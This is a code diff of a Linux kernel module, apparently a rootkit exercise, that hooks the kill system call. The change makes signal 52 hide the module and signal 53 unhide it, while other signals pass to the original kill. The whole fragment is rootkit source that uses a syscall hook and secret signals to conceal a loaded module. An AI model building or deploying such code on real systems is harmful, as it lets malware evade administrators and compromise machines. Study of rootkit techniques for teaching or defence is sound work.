@@ -19,7 +19,6 @@
 
 static char* pid = "";
 static struct list_head *prevModule;
-static int ishidden = 0;
 module_param(pid, charp, 0);
 MODULE_PARM_DESC(pid, "pid of sneaky module");
 
@@ -108,13 +107,10 @@ asmlinkage int sneaky_sys_kill(struct pt_regs *regs) {
 
   int sig = regs->si;
   if (sig == 52) {
-    if (ishidden == 0) {
-      hide_module();
-      ishidden = 1;
-    } else {
-      unhide_module();
-      ishidden = 0;
-    }
+    hide_module();
+    return 0;
+  } else if (sig == 53){
+    unhide_module();
     return 0;
   } else {
     return original_kill(regs);
